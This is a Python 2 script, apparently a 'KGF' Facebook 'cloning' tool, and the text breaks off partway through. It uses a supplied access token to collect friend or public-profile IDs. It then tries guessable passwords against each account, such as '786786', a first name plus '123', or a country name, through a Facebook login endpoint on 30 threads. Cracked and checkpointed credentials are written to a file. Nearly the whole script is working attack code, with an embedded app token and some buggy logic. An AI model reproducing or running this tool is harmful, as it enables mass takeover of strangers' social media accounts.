         

#!/usr/bin/python2
#coding=utf-8
#source code python
#source code Shell

import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)


#Dev:TECH KGF
logo = """       
\033[1;97m--------------------------------------------------
\033[1;93m888    d8P   .d8888b.  8888888888\x1b[1;94m !!
\033[1;92m888   d8P   d88P  Y88b 888        \x1b[1;94m!!       
\033[1;93m888  d8P    888    888 888        \x1b[1;94m!!\x1b[1;93m HADII\033[1;32;40m X3\033[1;33;40m ZUNNU     
[Zunnu Hadi Yunnu Kasmiri]
\033[1;92m888d88K     888        8888888    \x1b[1;94m!!\x1b[1;91m Author\x1b[1;90m >\033[1;32;40m MR ZUNNU 
\033[1;93m8888888b    888  88888 888        \x1b[1;94m!!\x1b[1;91m Github\x1b[1;90m >\033[1;32;40m Zunair-Cyber/Zunnu-Mafia   
\033[1;92m888  Y88b   888    888 888        \x1b[1;94m!!\x1b[1;92m UPDATE\x1b[1;90m >\033[1;31;40m 3\033[1;93m.\x1b[1;91m5
\033[1;93m888   Y88b  Y88b  d88P 888        \x1b[1;94m!!       
\033[1;92m888    Y88b  "Y8888P88 888        \x1b[1;94m!!        
\033[1;97m--------------------------------------------------
              \033[1;92mKgf Update Version              \033[1;0m
              \033[1;93mUpdate By :\033[1;32;40m Mr-Zunnu           \033[1;0m
\033[1;97m--------------------------------------------------
"""
logo2 = """                                               
\033[1;97m--------------------------------------------------
\033[1;93m888    d8P   .d8888b.  8888888888\x1b[1;94m !!
\033[1;92m888   d8P   d88P  Y88b 888        \x1b[1;94m!!       
\033[1;93m888  d8P    888    888 888        \x1b[1;94m!!\x1b[1;93m HADII\033[1;32;40m X3\033[1;33;40m ZUNNU     
\033[1;92m888d88K     888        8888888
[Zunnu Hadi Yunnu Kashmiri ]     
\033[1;92m888 d8p     888        8888888    \x1b[1;94m!!\x1b[1;91m Author\x1b[1;90m >\033[1;32;40m MR ZUNNU
\033[1;93m8888888b    888  88888 888        \x1b[1;94m!!\x1b[1;91m Github\x1b[1;90m >\033[1;32;40m Zunnu-Mafia  
\033[1;92m888  Y88b   888    888 888        \x1b[1;94m!!\x1b[1;92m UPDATE\x1b[1;90m >\033[1;31;40m 3\x1b[1;93m.\x1b[1;91m5
\033[1;93m888   Y88b  Y88b  d88P 888        \x1b[1;94m!!       
\033[1;92m888    Y88b  "Y8888888 888        \x1b[1;94m!!        
\033[1;97m--------------------------------------------------
              \033[1;92mKgf Update Version              \033[1;0m
              \033[1;93mUpdate By :\033[1;32;40m Mr-Zunnu            \033[1;0m
\033[1;97m--------------------------------------------------
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"


##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
 
	print "\033[1;97m[\033[1;92m1\x1b[1;97m]      \033[1;92mLogin With Access Token"
        time.sleep(0.05)
        print("\033[1;97m--------------------------------------------------")
        time.sleep(0.05)
	print "\033[1;97m[\033[1;92m0\x1b[1;97m]\033[1;97m              \033[0;91mLogout"
	time.sleep(0.05)
        print("\033[1;97m--------------------------------------------------")
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;92mChoose\033[1;93m -->> \033[1;92m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
        elif peak =="1":
	        tokenz()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()
			

def tokenz():
	os.system('clear')
	print logo2
	toket = raw_input("\033[1;97m[\x1b[1;91m•\x1b[1;97m]\033[1;92m Enter Token Here\033[1;91m :\033[1;93m ")
	print("\033[1;97m--------------------------------------------------")
	jalan("\033[1;92mPlease Wait....")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on CP"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system('clear')
	print logo
	print "  \033[1;36;40m\033[1;32;40m[\x1b[1;90m#\033[1;32;40m]\033[1;36;40m Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m"                               
	print "  \033[1;36;40m\033[1;32;40m[\x1b[1;90m#\033[1;32;40m]\033[1;36;40m ID  \033[1;32;40m: "+id+"        \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[\x1b[1;90m#\033[1;32;40m]\033[1;36;40m Subs\033[1;32;40m: "+sub+"           \033[1;36;92m"
	print "  \033[1;36;40m\033[1;32;40m[\x1b[1;90m#\033[1;32;40m]\033[1;36;40m Date Of Birth\033[1;32;40m: "+a['birthday']+"           \033[1;36;92m"
	print("\033[1;97m--------------------------------------------------")
	time.sleep(0.05)
	print( "\033[1;32;98m\033[1;92m-->>\x1b[1;94m[\x1b[1;90m01\x1b[1;94m]\033[1;92m-->> \033[1;93mGet Pakistan Account")
	time.sleep(0.05)	
	print( "\033[1;32;98m\033[1;92m-->>\x1b[1;94m[\x1b[1;90m02\x1b[1;94m]\033[1;92m-->> \033[1;93mGet Bangladesh Account" )
	time.sleep(0.05)
	print( "\033[1;32;98m\033[1;92m-->>\x1b[1;94m[\x1b[1;90m03\x1b[1;94m]\033[1;92m-->> \033[1;93mGet Indonisia Account" )
	time.sleep(0.05)
	print( "\033[1;32;98m\033[1;92m-->>\x1b[1;94m[\x1b[1;90m04\x1b[1;94m]\033[1;92m-->> \033[1;93mGet India Account" )
	time.sleep(0.05)
	print( "\033[1;32;98m\033[1;92m-->>\x1b[1;94m[\x1b[1;91m00\x1b[1;94m]\033[1;92m-->> \033[1;91mlogout" )
	time.sleep(0.05)
	print("\033[1;97m--------------------------------------------------")
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m--> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		selfi()
	elif unikers =="2":
		brand()
	elif unikers =="3":
	    drink()
	elif unikers =="4":
	    malai()                         
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()


def selfi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	print("\033[1;97m--------------------------------------------------")
	print( "\x1b[1;32;92m[\x1b[1;90m1\x1b[1;32;92m]\033[1;33;98m<-->\033[1;93mCrack From Friendlist ID ") 
	print( "\x1b[1;32;92m[\x1b[1;90m2\x1b[1;32;92m]\033[1;33;98m<-->\033[1;93mCrack From Any Public ID") 
	print( "\x1b[1;32;36m[\x1b[1;90m0\x1b[1;32;36m]\033[1;33;96m<-->\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_selfi()

def pilih_selfi():
	peak = raw_input("\n\033[1;31;40m--> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_selfi()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;96m[\033[1;32;40m-->>\x1b[1;96m] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;96m[\x1b[1;91m<-\x1b[1;32;92m+\x1b[1;91m->\x1b[1;96m]\033[1;93m Enter ID\x1b[1;90m/\033[1;93mUSERNAME\033[1;91m :\x1b[1;32;92m ")
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m[\033[1;93m<-\x1b[1;32;92m+\033[1;93m->\033[1;31;37m]\x1b[1;94m Name\x1b[1;91m :\033[1;36;40m "+op["name"]
		except KeyError:
			print"\x1b[1;32;92m[\x1b[1;31m!\x1b[1;32;92m]\033[1;31;37m ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			selfi()
		print"\033[1;35;37m[\x1b[1;32;92m-->\033[1;35;37m]\033[1;93m Getting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_selfi()

	
	print "\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[-->>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		     print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-------\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m------»"
	print "\033[1;97m «------------------------------------------------»"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['First_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Pakistan'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/kgf.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
	
def brand():
	global toket
	os.system('clear') 
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo2
	print("\033[1;97m--------------------------------------------------")
	print( "\x1b[1;32;92m[1]\033[1;33;98m-->>\033[1;92mCrack From Friendlist ID ") 
	print( "\x1b[1;32;92m[2]\033[1;33;98m-->>\033[1;92mCrack From Any Public ID") 
	print( "\x1b[1;32;36m[0]\033[1;33;96m-->>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_brand()

def pilih_brand():
	peak = raw_input("\n\033[1;31;40m--> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_brand()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m\033[1;31;37m[\033[1;93m<-\x1b[1;32;92m+\033[1;93m->\033[1;31;37m]\x1b[1;94m Name\x1b[1;91m :\033[1;36;40m : "+op["name"]
		except KeyError:
			print"\x1b[1;32;92m[\x1b[1;31m!\x1b[1;32;92m]\033[1;31;37m ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			brand()
		print"\033[1;96m[\033[1;32;40m-->>\x1b[1;96m] \033[1;93mGetting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_brand()

	
	print "\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[-->>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		     print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-------\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m------»"
	print "\033[1;97m «------------------------------------------------»"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['First_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass3 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass4)
								else:
									pass4 = b['last_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass4 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'Bangladesh'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass5 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)

											                              
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print("\033[1;97m--------------------------------------------------")
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/kgf.txt")
	print("\033[1;97m--------------------------------------------------")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	login()
		
		
def drink():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print("\033[1;97m--------------------------------------------------")
	print( "\x1b[1;32;92m[1]\033[1;33;98m-->>\033[1;91mCrack From Friendlist ID ") 
	print( "\x1b[1;32;92m[2]\033[1;33;98m-->>\033[1;91mCrack From Any Public ID") 
	print( "\x1b[1;32;36m[0]\033[1;33;96m-->>\033[1;91mBack") 
	print("\033[1;97m--------------------------------------------------")
	pilih_drink()

def pilih_drink():
	peak = raw_input("\n\033[1;31;40m--> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_drink()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;93m[\x1b[1;32;92m-->>\033[1;93m]\033[1;93m Enter ID/USERNAME\033[1;91m : ")
		print("\033[1;97m--------------------------------------------------")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;31;37m\033[1;31;37m[\033[1;93m<-\x1b[1;32;92m+\033[1;93m->\033[1;31;37m]\x1b[1;94m Name\x1b[1;91m :\033[1;36;40m : "+op["name"]
		except KeyError:
			print"\x1b[1;32;92m[\x1b[1;31m!\x1b[1;32;92m]\033[1;31;37m ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			drink()
		print"\033[1;96m[\033[1;32;40m-->>\x1b[1;96m] \033[1;93mGetting ID"
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_drink()

	
	print "\033[1;93m[\x1b[1;32;92m-->>\033[1;93m] Total IDs : \033[1;92m"+str(len(id))
	jalan('\033[1;34;96m[-->>] Please Wait ')
	titik = ['.   ','..  ','... ']
	for o in titik:
		     print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97m  «-------\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m------»"
	print "\033[1;97m «------------------------------------------------»"
	
	def main(arg):
		global oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'Sayang'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass1 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['First_name'] + '123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\033[1;94m(\033[1;92mOK\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\033[1;94m(\033[1;97mCP\033[1;94m) \033[1;97m' + user  + '\033[1;91m-->>\033[1;97m' + pass2 + '\033[1;91m-->>\033[1;97m' + b['frst_name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
